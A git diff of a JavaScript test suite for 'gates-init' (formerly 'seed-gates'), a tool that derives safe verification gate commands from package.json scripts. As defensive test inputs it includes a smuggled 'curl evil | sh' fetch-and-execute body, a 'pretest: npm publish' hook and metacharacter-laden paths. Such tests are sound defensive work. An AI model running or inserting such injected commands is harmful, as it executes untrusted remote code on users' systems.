@@ -9,18 +9,18 @@ import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import {
-  SEED_GATES_STOP,
+  GATES_INIT_STOP,
   TRUST_CHAIN_DISCLOSURE,
   detectPackageManager,
   kebabIdOf,
   deriveScriptEntries,
   reviewStateCandidate,
-  reviewLedgerCandidate,
+  coverageCheckCandidate,
   buildOffer,
   formatPreview,
-  applySeed,
+  applyFill,
   main,
-} from './seed-gates.mjs';
+} from './gates-init.mjs';
 import { loadDeclaration, validateDeclaration } from './run-gates.mjs';
 import { KIT_WRITER_PREVIEW_TOOLS, UNIVERSAL_READONLY_ALLOWLIST } from './velocity-profile.mjs';
 
@@ -49,7 +49,7 @@ let cwd;
 beforeEach(() => {
   // realpath: a fixture cwd under a symlinked OS tmp dir (macOS /tmp -> /private/tmp) must not
   // trip the Decision-5 symlink-root refusal.
-  cwd = realpathSync(mkdtempSync(join(tmpdir(), 'seed-gates-')));
+  cwd = realpathSync(mkdtempSync(join(tmpdir(), 'gates-init-')));
 });
 afterEach(() => rmSync(cwd, { recursive: true, force: true }));
 
@@ -117,7 +117,7 @@ const seededCmdOf = (id = 'test') => {
 
 // ── derivation invariants (LOCKED in the plan) ────────────────────────────────────────
 
-describe('seed-gates — derivation: warn-flagged candidates NEVER enter the offer', () => {
+describe('gates-init — derivation: warn-flagged candidates NEVER enter the offer', () => {
   it('release/publish/deploy/push/version/commit/tag + pre/post hooks are excluded, not offered-with-a-warning', () => {
     mkProject({ scripts: {
       test: 'node --test', 'release:npm': 'npm publish', deploy: 'x', push: 'x', version: 'x',
@@ -128,7 +128,7 @@ describe('seed-gates — derivation: warn-flagged candidates NEVER enter the off
   });
 });
 
-describe('seed-gates — derivation: only TERMINATING verification classes are offered', () => {
+describe('gates-init — derivation: only TERMINATING verification classes are offered', () => {
   it('test/lint/type-check/build classes are offered; dev/start/watch/serve/preview and formatter write-mode are not', () => {
     mkProject({ scripts: {
       test: 'node --test', 'test:unit': 'node --test', lint: 'eslint .', typecheck: 'tsc --noEmit',
@@ -209,14 +209,14 @@ describe('seed-gates — derivation: only TERMINATING verification classes are o
   });
 });
 
-describe('seed-gates — derivation: package-manager detection (the cmd-shape pins live in T4)', () => {
+describe('gates-init — derivation: package-manager detection (the cmd-shape pins live in T4)', () => {
   it('the package.json packageManager field beats the lockfile probe', () => {
     mkProject({ scripts: { test: 'x' }, lockfile: 'yarn.lock', packageManager: 'pnpm@9.0.0' });
     assert.equal(detectPackageManager(cwd), 'pnpm');
   });
 });
 
-describe('seed-gates — derivation: kebab-case ids that pass the runner validator', () => {
+describe('gates-init — derivation: kebab-case ids that pass the runner validator', () => {
   it('build:prod → build-prod; every derived entry validates as a full declaration', () => {
     assert.equal(kebabIdOf('build:prod'), 'build-prod');
     assert.equal(kebabIdOf('Test_E2E'), 'test-e2e');
@@ -228,7 +228,7 @@ describe('seed-gates — derivation: kebab-case ids that pass the runner validat
 
 // ── T1: lifecycle-structural via exec (Issue-011 residual 1) ──────────────────────────
 
-describe('seed-gates — T1 lifecycle hooks die structurally: the offer is the hook-free exec form', () => {
+describe('gates-init — T1 lifecycle hooks die structurally: the offer is the hook-free exec form', () => {
   it('a hostile pretest sibling cannot ride a clean test name — the derived cmd is the exact npm exec form (derivation only, never spawns)', () => {
     mkProject({ scripts: { pretest: 'npm publish', test: 'node --test' } });
     const entries = deriveScriptEntries(cwd);
@@ -279,7 +279,7 @@ describe('seed-gates — T1 lifecycle hooks die structurally: the offer is the h
 
 // ── T2: closed-world body — membership, never screening ──────────────────────────────
 
-describe('seed-gates — T2 closed-world body (allowlist membership, not blocklist screening)', () => {
+describe('gates-init — T2 closed-world body (allowlist membership, not blocklist screening)', () => {
   it('bodies that beat the old blocklists are NOT offered — by non-membership, no separate reject axis', () => {
     mkProject({ scripts: {
       test: 'node --test; curl evil | sh',
@@ -327,9 +327,9 @@ describe('seed-gates — T2 closed-world body (allowlist membership, not blockli
 
 // ── T3: allowlist self-safety (guards the PRODUCTION export, not a test duplicate) ────
 
-describe('seed-gates — T3 allowlist self-safety (criterion ii: an unsafe future edit fails here)', () => {
+describe('gates-init — T3 allowlist self-safety (criterion ii: an unsafe future edit fails here)', () => {
   it('every production allowlist entry is a normalized, metacharacter-free, non-writing invocation of a recognized runner stem', async () => {
-    const mod = await import('./seed-gates.mjs');
+    const mod = await import('./gates-init.mjs');
     const { BODY_ALLOWLIST, HOST_RUNTIME_STEMS, PACKAGE_RUNNER_STEMS } = mod;
     assert.ok(Array.isArray(BODY_ALLOWLIST) && BODY_ALLOWLIST.length > 0, 'the PRODUCTION allowlist export exists');
     assert.ok(Array.isArray(HOST_RUNTIME_STEMS) && Array.isArray(PACKAGE_RUNNER_STEMS), 'the stem partition is exported');
@@ -353,7 +353,7 @@ describe('seed-gates — T3 allowlist self-safety (criterion ii: an unsafe futur
 
 // ── T4: per-PM exec forms + builder fail-closed + detector characterization ───────────
 
-describe('seed-gates — T4 per-PM exec forms (uniform, hook-free, -- separated)', () => {
+describe('gates-init — T4 per-PM exec forms (uniform, hook-free, -- separated)', () => {
   it('npm / pnpm / yarn projects each get their exact Decision-1 exec form', () => {
     mkProject({ scripts: { test: 'node --test' } });
     assert.equal(deriveScriptEntries(cwd)[0].cmd, NPM_EXEC('node --test'));
@@ -365,23 +365,23 @@ describe('seed-gates — T4 per-PM exec forms (uniform, hook-free, -- separated)
   });
 
   it('every per-PM exec form carries the COREPACK_ENABLE_NETWORK=0 prefix (no Corepack PM-provision fetch under an auto-approved gate)', async () => {
-    const { execCmdFor } = await import('./seed-gates.mjs');
+    const { execCmdFor } = await import('./gates-init.mjs');
     for (const pm of ['npm', 'pnpm', 'yarn']) {
       assert.match(execCmdFor(pm, 'node --test').cmd, /^COREPACK_ENABLE_NETWORK=0 /, `${pm} form disables Corepack network`);
     }
   });
 
-  it('the review-state/review-ledger candidates are still offered under any PM (the slot rule is PM-independent)', () => {
+  it('the review-state/coverage-check candidates are still offered under any PM (the slot rule is PM-independent)', () => {
     mkProject({
       scripts: { test: 'node --test' },
       lockfile: 'pnpm-lock.yaml',
       config: { 'plan-execution': { review: 'council' } },
     });
-    assert.deepEqual(buildOffer(cwd).entries.map((e) => e.id), ['test', 'review-state', 'review-ledger']);
+    assert.deepEqual(buildOffer(cwd).entries.map((e) => e.id), ['test', 'review-state', 'coverage-check']);
   });
 
   it('T4b: the cmd builder fails CLOSED on an unknown pm family — withhold with a loud note, never any run form', async () => {
-    const { execCmdFor } = await import('./seed-gates.mjs');
+    const { execCmdFor } = await import('./gates-init.mjs');
     assert.equal(typeof execCmdFor, 'function', 'the PRODUCTION builder export exists');
     const r = execCmdFor('bun', 'node --test');
     assert.equal(r.cmd, null, 'no cmd for an unverified family');
@@ -407,7 +407,7 @@ describe('seed-gates — T4 per-PM exec forms (uniform, hook-free, -- separated)
   });
 });
 
-describe('seed-gates — T4d per-PM no-network fail-closed (missing package-runner)', () => {
+describe('gates-init — T4d per-PM no-network fail-closed (missing package-runner)', () => {
   it('npm: --offline + an ISOLATED empty cache → the missing runner is refused as a cache miss, never fetched', () => {
     mkProject({ scripts: { test: 'vitest run' } });
     const r = spawnSeeded(seededCmdOf('test'));
@@ -452,7 +452,7 @@ describe('seed-gates — T4d per-PM no-network fail-closed (missing package-runn
 
 // ── T5: leading-dash name (ALWAYS-GREEN characterization) ─────────────────────────────
 
-describe('seed-gates — T5 a leading-dash script name never enters the offer', () => {
+describe('gates-init — T5 a leading-dash script name never enters the offer', () => {
   it('the ^-anchored terminating-class pattern makes "-test" unreachable (characterized)', () => {
     mkProject({ scripts: { '-test': 'node --test', test: 'node --test' } });
     assert.deepEqual(deriveScriptEntries(cwd).map((e) => e.id), ['test']);
@@ -461,7 +461,7 @@ describe('seed-gates — T5 a leading-dash script name never enters the offer', 
 
 // ── T6: offer honesty — screened-out scripts are named, the residual is disclosed ─────
 
-describe('seed-gates — T6 offer honesty (nothing screened out silently)', () => {
+describe('gates-init — T6 offer honesty (nothing screened out silently)', () => {
   it('gate-class-named scripts with non-allowlisted bodies are counted and named (ids) in a preview note with the hand-add pointer', () => {
     mkProject({ scripts: { test: 'mocha', 'test:e2e': 'playwright test', lint: 'eslint .' } });
     const io = quiet();
@@ -508,9 +508,9 @@ describe('seed-gates — T6 offer honesty (nothing screened out silently)', () =
 
 // ── T7: preflight parent-chain (Issue-011 residual 3) — seeder-level integration ──────
 
-describe('seed-gates — T7 a symlinked docs PARENT is a preflight STOP on preview AND apply', () => {
+describe('gates-init — T7 a symlinked docs PARENT is a preflight STOP on preview AND apply', () => {
   it('preview and apply both STOP (exit 1) naming the symlinked component, before any read', () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), 'seed-gates-symlink-')));
+    const root = realpathSync(mkdtempSync(join(tmpdir(), 'gates-init-symlink-')));
     try {
       mkdirSync(join(root, 'target', 'ai'), { recursive: true });
       writeFileSync(join(root, 'target', 'ai', '.workflow-version'), '2.0.0\n');
@@ -531,7 +531,7 @@ describe('seed-gates — T7 a symlinked docs PARENT is a preflight STOP on previ
 
 // ── the review-state candidate (locked decision) ─────────────────────────────────────
 
-describe('seed-gates — the review-state candidate keys on the slot the checker enforces', () => {
+describe('gates-init — the review-state candidate keys on the slot the checker enforces', () => {
   const COUNCIL_ON_EXECUTION = { 'plan-execution': { review: 'council' } };
 
   it('offered when plan-execution.review declares reviewed/council; cmd is QUOTED and validates', () => {
@@ -573,35 +573,41 @@ describe('seed-gates — the review-state candidate keys on the slot the checker
   });
 });
 
-// ── the review-ledger candidate (AD-045) — same conditional rule, distinct axis ───────
-describe('seed-gates — the review-ledger candidate keys on the same slot (AD-045)', () => {
+// ── the coverage-check candidate (D3(a)) — same conditional rule, the core-pair sibling ───────
+describe('gates-init — the coverage-check candidate keys on the same slot (D3(a))', () => {
   const COUNCIL_ON_EXECUTION = { 'plan-execution': { review: 'council' } };
 
   it('offered when plan-execution.review declares reviewed/council; cmd is QUOTED and validates', () => {
     mkProject({ scripts: {}, config: COUNCIL_ON_EXECUTION });
-    const { candidate } = reviewLedgerCandidate(cwd);
+    const { candidate } = coverageCheckCandidate(cwd);
     assert.ok(candidate, 'the candidate must be offered');
-    assert.equal(candidate.id, 'review-ledger');
-    assert.match(candidate.cmd, /^node "[^"]*tools\/review-ledger\.mjs" --check$/, 'resolved + QUOTED path (spaces survive)');
+    assert.equal(candidate.id, 'coverage-check');
+    assert.match(candidate.cmd, /^node "[^"]*tools\/coverage-check\.mjs" --check$/, 'resolved + QUOTED path (spaces survive)');
     assert.deepEqual(validateDeclaration({ gates: [candidate] }), [candidate]);
   });
 
   it('a kit path with shell metacharacters is WITHHELD (loud note)', () => {
     mkProject({ scripts: {}, config: COUNCIL_ON_EXECUTION });
-    const r = reviewLedgerCandidate(cwd, { reviewLedgerTool: '/tmp/kit$dir/tools/review-ledger.mjs' });
+    const r = coverageCheckCandidate(cwd, { coverageCheckTool: '/tmp/kit$dir/tools/coverage-check.mjs' });
     assert.equal(r.candidate, null);
     assert.ok(r.note && /by hand/i.test(r.note), 'the withhold is stated with the hand-add recovery');
   });
 
   it('NEVER offered on a solo config or a council-on-plan-authoring-ONLY config', () => {
     mkProject({ scripts: {}, config: { 'plan-authoring': { review: 'council' }, 'plan-execution': { review: 'solo' } } });
-    assert.equal(reviewLedgerCandidate(cwd).candidate, null);
+    assert.equal(coverageCheckCandidate(cwd).candidate, null);
+  });
+
+  it('buildOffer appends coverage-check LAST — a whole-offer apply is final-ready by construction', () => {
+    mkProject({ scripts: { test: 'node --test' }, config: COUNCIL_ON_EXECUTION });
+    const ids = buildOffer(cwd).entries.map((e) => e.id);
+    assert.equal(ids[ids.length - 1], 'coverage-check');
   });
 });
 
 // ── preview (dry-run) behavior ────────────────────────────────────────────────────────
 
-describe('seed-gates — preview is the default and writes NOTHING', () => {
+describe('gates-init — preview is the default and writes NOTHING', () => {
   it('dry-run leaves an existing gates.json byte-identical and prints the derived entries + the trust-chain disclosure', () => {
     mkProject({ scripts: { test: 'node --test' }, gates: { _README: 'mine', gates: [{ id: 'own', title: 'Own', cmd: 'true' }] } });
     const before = gatesRaw();
@@ -615,8 +621,8 @@ describe('seed-gates — preview is the default and writes NOTHING', () => {
     assert.match(text, /auto-approves byte-exact declared gate commands/, 'the hook implication is stated');
     assert.match(text, /two separate yeses/, 'the two-consent boundary is stated');
     // The consent step must print a RUNNABLE apply command (this tool has no bin and no mode token).
-    assert.match(text, /node "[^"]*seed-gates\.mjs" --cwd "[^"]*" --apply/, 'the apply hint is the real invocation');
-    assert.doesNotMatch(text, /(^|\s)seed-gates --apply/, 'never a bare non-runnable seed-gates command');
+    assert.match(text, /node "[^"]*gates-init\.mjs" --cwd "[^"]*" --apply/, 'the apply hint is the real invocation');
+    assert.doesNotMatch(text, /(^|\s)gates-init --apply/, 'never a bare non-runnable gates-init command');
   });
 
   it('a dry-run with --only prints an apply hint carrying EXACTLY those --only flags (the hint never widens the previewed consent)', () => {
@@ -630,7 +636,7 @@ describe('seed-gates — preview is the default and writes NOTHING', () => {
   });
 
   it('a cwd with double-quote-unsafe metacharacters gets a SAFE generic apply hint, never a broken quoted command', () => {
-    const evil = mkdtempSync(join(tmpdir(), 'seed-gates-$evil-'));
+    const evil = mkdtempSync(join(tmpdir(), 'gates-init-$evil-'));
     try {
       mkdirSync(join(evil, 'docs', 'ai'), { recursive: true });
       writeFileSync(join(evil, 'docs', 'ai', '.workflow-version'), '2.0.0\n');
@@ -656,7 +662,7 @@ describe('seed-gates — preview is the default and writes NOTHING', () => {
 
 // ── apply behavior (append-only, consented subset, atomic discipline) ─────────────────
 
-describe('seed-gates — --apply appends exactly the consented entries', () => {
+describe('gates-init — --apply appends exactly the consented entries', () => {
   it('appends the --only subset after the existing entries; existing entries stay unmodified; result validates', () => {
     const own = { id: 'own', title: 'Own', cmd: 'true' };
     mkProject({ scripts: { test: 'node --test', lint: 'eslint .', build: 'vite build' }, gates: { _README: 'mine', gates: [own] } });
@@ -758,15 +764,15 @@ describe('seed-gates — --apply appends exactly the consented entries', () => {
 
 // ── structural invariants ─────────────────────────────────────────────────────────────
 
-describe('seed-gates — import direction + tier absence (structural)', () => {
-  it('run-gates.mjs (the runner) never imports the seeder — the seeder imports the validator, not the reverse', () => {
+describe('gates-init — import direction + tier absence (structural)', () => {
+  it('run-gates.mjs (the runner) never imports the fill preview — the preview imports the validator, not the reverse', () => {
     const src = readFileSync(join(HERE, 'run-gates.mjs'), 'utf8');
-    assert.ok(!/from\s+['"][^'"]*seed-gates/.test(src), 'run-gates.mjs must not import seed-gates (the runner WRITES NOTHING)');
+    assert.ok(!/from\s+['"][^'"]*gates-init/.test(src), 'run-gates.mjs must not import gates-init (the runner WRITES NOTHING)');
   });
 
-  it('procedures.mjs (read-only advisor) never imports the seeder nor the atomic-write core', () => {
+  it('procedures.mjs (read-only advisor) never imports the fill preview nor the atomic-write core', () => {
     const src = readFileSync(join(HERE, 'procedures.mjs'), 'utf8');
-    for (const mod of ['seed-gates', 'atomic-write']) {
+    for (const mod of ['gates-init', 'atomic-write']) {
       assert.ok(
         !new RegExp(`from\\s+['"][^'"]*${mod}`).test(src) && !new RegExp(`import\\(\\s*['"][^'"]*${mod}`).test(src),
         `procedures.mjs must not import ${mod} (read-only invariant)`,
@@ -774,20 +780,73 @@ describe('seed-gates — import direction + tier absence (structural)', () => {
     }
   });
 
-  it('the seeder is OUTSIDE every velocity tier — a consent-per-run writer is never pre-approved', () => {
+  it('the fill preview is OUTSIDE every velocity tier — a consent-per-run writer is never pre-approved', () => {
     for (const rel of KIT_WRITER_PREVIEW_TOOLS) {
-      assert.ok(!rel.includes('seed-gates'), `seed-gates must not be in KIT_WRITER_PREVIEW_TOOLS (found ${rel})`);
+      assert.ok(!rel.includes('gates-init'), `gates-init must not be in KIT_WRITER_PREVIEW_TOOLS (found ${rel})`);
     }
     for (const entry of UNIVERSAL_READONLY_ALLOWLIST) {
-      assert.ok(!String(entry).includes('seed-gates'), `seed-gates must not appear in the core allowlist (${entry})`);
+      assert.ok(!String(entry).includes('gates-init'), `gates-init must not appear in the core allowlist (${entry})`);
     }
   });
 
-  it('the offer composes script entries + the conditional review-state candidate (buildOffer)', () => {
+  it('the offer composes script entries + the conditional core-pair candidates (buildOffer)', () => {
     mkProject({ scripts: { test: 'node --test' }, config: { 'plan-execution': { review: 'council' } } });
     const offer = buildOffer(cwd);
-    assert.deepEqual(offer.entries.map((e) => e.id), ['test', 'review-state', 'review-ledger']);
+    assert.deepEqual(offer.entries.map((e) => e.id), ['test', 'review-state', 'coverage-check']);
     const preview = formatPreview(offer);
     assert.ok(preview.includes(TRUST_CHAIN_DISCLOSURE));
+  });
+});
+
+// ── refusal / degradation branches ────────────────────────────────────────────────────
+
+describe('gates-init — refusal and degradation branches', () => {
+  it('--help prints the usage and exits 0; an unknown argument is a loud usage error', () => {
+    const io = quiet();
+    assert.equal(main(['--help'], io), 0);
+    assert.match(io.out.join('\n'), /gates-init/);
+    const io2 = quiet();
+    assert.equal(main(['--bogus'], io2), 2);
+    assert.match(io2.out.join('\n'), /unknown argument/);
+  });
+
+  it('NO package.json at all: an honest empty offer, never a crash', () => {
+    mkdirSync(join(cwd, 'docs', 'ai'), { recursive: true });
+    writeFileSync(join(cwd, 'docs', 'ai', '.workflow-version'), '2.0.0\n');
+    const io = quiet();
+    assert.equal(main(['--cwd', cwd], io), 0);
+    assert.match(io.out.join('\n'), /nothing to offer/);
+  });
+
+  it('a MALFORMED orchestration.json degrades the coverage-check candidate to a stated note', () => {
+    mkProject({ scripts: { test: 'node --test' } });
+    writeFileSync(join(cwd, 'docs', 'ai', 'orchestration.json'), '{ not json');
+    const io = quiet();
+    assert.equal(main(['--cwd', cwd], io), 0);
+    assert.match(io.out.join('\n'), /coverage-check candidate was not evaluated/);
+  });
+
+  it('a parseable-but-INVALID existing declaration is a loud apply STOP (never written over)', () => {
+    mkProject({ scripts: { test: 'node --test' }, gates: { gates: [{ id: 42 }] } });
+    const io = quiet();
+    assert.equal(main(['--cwd', cwd, '--apply'], io), 1);
+    assert.match(io.out.join('\n'), /fix it by hand/);
+  });
+
+  it('an unreadable bundled template is a loud apply STOP naming the broken install', () => {
+    mkProject({ scripts: { test: 'node --test' } });
+    const io = quiet();
+    const code = main(['--cwd', cwd, '--apply'], { ...io, readTemplate: () => { throw new Error('injected'); } });
+    assert.equal(code, 1);
+    assert.match(io.out.join('\n'), /kit install is incomplete/);
+  });
+
+  it('a MISSING deployment stamp gates --apply (the preview stays available)', () => {
+    mkProject({ scripts: { test: 'node --test' }, stamp: null });
+    const io = quiet();
+    assert.equal(main(['--cwd', cwd, '--apply'], io), 1);
+    assert.match(io.out.join('\n'), /absent/);
+    const io2 = quiet();
+    assert.equal(main(['--cwd', cwd], io2), 0, 'the preview works on any deployment');
   });
 });
